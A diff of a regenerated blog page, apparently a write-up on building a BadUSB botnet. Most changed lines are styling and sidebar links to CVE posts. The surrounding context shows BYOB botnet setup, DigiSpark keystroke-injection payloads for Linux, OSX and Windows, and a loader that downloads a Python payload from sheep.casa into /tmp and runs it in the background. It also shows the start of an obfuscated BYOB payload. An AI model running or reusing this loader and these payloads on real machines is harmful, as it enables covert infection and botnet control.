@@ -97,13 +97,13 @@
 
 
 
-<meta name="generator" content="Hugo 0.154.2">
+<meta name="generator" content="Hugo 0.162.0">
 
 
     
     
 
-<link type="text/css" rel="stylesheet" href="/css/bundle.min.2079d7b1d4c2ab5bcf5b79f133cf9778b6f5d2c4b6169ee745a2267ed4a29706.css">
+<link type="text/css" rel="stylesheet" href="/css/bundle.min.b29560288abdb6366b230cde3c59285c98c1152dccc466ddf7135289406f621e.css">
 
 
     
@@ -283,6 +283,8 @@
                 
                         
                 
+                        
+                
             
         
         
@@ -303,6 +305,10 @@
                         </li>
                         
                             <li class="bullet">
+                                <a href="https://ryankozak.com/posts/cve-2026-7537/">MDJM Event Management &lt;= 1.7.8.3 - Authenticated (Administrator&#43;) Arbitrary File Upload via mdjm_email_upload_file Parameter</a>
+                            </li>
+                        
+                            <li class="bullet">
                                 <a href="https://ryankozak.com/posts/cve-2025-13374/">Kalrav AI Agent &lt;= 2.3.3 - Unauthenticated Arbitrary File Upload via kalrav_upload_file AJAX Action</a>
                             </li>
                         
@@ -318,10 +324,6 @@
                                 <a href="https://ryankozak.com/posts/cve-2025-12721/">g-FFL Cockpit &lt;= 1.7.1 - Missing Authorization to Unauthenticated Information Exposure</a>
                             </li>
                         
-                            <li class="bullet">
-                                <a href="https://ryankozak.com/posts/cve-2025-12189/">Bread &amp; Butter: Gate content &#43; Capture leads &#43; Collect first-party data &#43; Nurture with Ai agents &lt;= 7.10.1321 - Cross-Site Request Forgery to Arbitrary File Upload</a>
-                            </li>
-                        
                     
                 
             
@@ -330,6 +332,8 @@
                 
             
                 
+                
+                        
                 
                         
                 
@@ -465,7 +469,7 @@
       "url": "\/images\/d0n601.png"
     }
   },
-  "image": "null",
+  "image": "\"/images/ryan‑kozak.jpg\"",
   "mainEntityOfPage": {
     "@type": "WebPage",
     "@id": "https:\/\/ryankozak.com\/posts\/bad-usb-botnet\/"
@@ -524,7 +528,7 @@
 <strong>Figure 2:</strong> ASCII sheep, just for fun.</p>
 <p>The botnet framework we chose (BYOB) was installed via <code>git clone git@github.com:malwaredllc/byob.git &amp;&amp; cd ./byob/byob &amp;&amp; pip install -r requirements.txt &amp;&amp;  mv ../../byob /opt/</code>. This clones the repository, installs the required python modules, and moves the directory to into <code>/opt</code>.</p>
 <p>To launch the botnet we&rsquo;ve created a bash script setting the host to <code>sheep.casa</code> and the listening port to <code>1337</code>. This script is placed in the <code>/root</code> directory.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span>cd /opt/byob/byob <span style="color:#f92672">&amp;&amp;</span> python server.py --port <span style="color:#ae81ff">1337</span>
 </span></span></code></pre></div><p><img src="/posts/images/bad-usb-botnet/boot_BYOB.png" alt="boot_BYOB">
 <strong>Figure 3:</strong> Botnet server running, no current sessions.</p>
@@ -546,7 +550,7 @@
 <strong>Figure 8:</strong> Set board to Digispark Default.</p>
 <h3 id="linux-payload">Linux Payload</h3>
 <p>The following code is what we&rsquo;ve developed to infect Linux machines upon plugin.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34;</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/***
@@ -571,7 +575,7 @@
 <p>The code for our <code>linux_loader</code> and <code>linux_payload.py</code> can be found in the section below.</p>
 <h4 id="linuxosx-loader">Linux/OSX Loader</h4>
 <p>Our BadUSB attack downloads and executes the loader script. For our attack on Linux and OSX machines this is a bash script called <code>linux_loader</code>, which can be found below.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/bash
 </span></span></span><span style="display:flex;"><span>nohup wget https://sheep.casa/payloads/linux_payload.py -P /tmp <span style="color:#f92672">&amp;&amp;</span> python /tmp/linux_payload.py
 </span></span></code></pre></div><p>The loader script downloads our python payload and executes it to join our botnet. This script is run in the background so that the terminal window is not present while the botnet client (payload) is running.</p>
 <h4 id="python-payload-for-botnet">Python Payload for Botnet</h4>
@@ -582,7 +586,7 @@
 <p><img src="/posts/images/bad-usb-botnet/payload_directory.png" alt="payload_directory">
 <strong>Figure 10:</strong> <code>/payloads</code> directory hosting our malicious files.</p>
 <p>Below is our <code>linux_payload.py</code> file generated by BYOB.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span>zlib<span style="color:#f92672">,</span>base64<span style="color:#f92672">,</span>marshal<span style="color:#f92672">,</span>json<span style="color:#f92672">,</span>urllib
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span>zlib<span style="color:#f92672">,</span>base64<span style="color:#f92672">,</span>marshal<span style="color:#f92672">,</span>json<span style="color:#f92672">,</span>urllib
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>version_info[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span>:
 </span></span><span style="display:flex;"><span>    <span style="color:#f92672">from</span> urllib <span style="color:#f92672">import</span> request
 </span></span><span style="display:flex;"><span>urlopen <span style="color:#f92672">=</span> urllib<span style="color:#f92672">.</span>request<span style="color:#f92672">.</span>urlopen <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>version_info[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">2</span> <span style="color:#66d9ef">else</span> urllib<span style="color:#f92672">.</span>urlopen
@@ -591,7 +595,7 @@
 <p>In order to prevent the keyboard configuration dialog box from appearing when the DigiSpark is plugged into an Apple computer, we must configure the DigiSpark to appear as if it&rsquo;s an Apple keyboard.</p>
 <p>VID and PID are defined in the file <code>~/.arduino15/packages/digistump/hardware/avr/1.6.7/libraries/DigisparkKeyboard/usbconfig.h</code>. We will replace the existing file with a <a href="./scripts/Digispark/usbconfig.h">modified Apple version</a> when compiling the script for OSX. When we change Vendor Name and Device Name, we also have to adapt the constants for the name length.</p>
 <p>The following code is what we&rsquo;ve developed to infect Apple OSX machines upon plugin.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34;</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">/***
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"> *
@@ -632,7 +636,7 @@
 <p>After this, in order to ensure we aren&rsquo;t using Z Shell, we&rsquo;ll enter <code>bash</code>. From this point on the rest of the code is exactly the same as our Linux payload. It too downloads <code>linux_loader</code>, which downloads and runs <code>linux_payload.py</code>.</p>
 <h3 id="windows">Windows</h3>
 <p>Below is the DigiSpark payload we developed to infect Windows victims.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34;</span><span style="color:#75715e">
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&#34;DigiKeyboard.h&#34;</span><span style="color:#75715e">
 </span></span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">setup</span>()
 </span></span><span style="display:flex;"><span>{
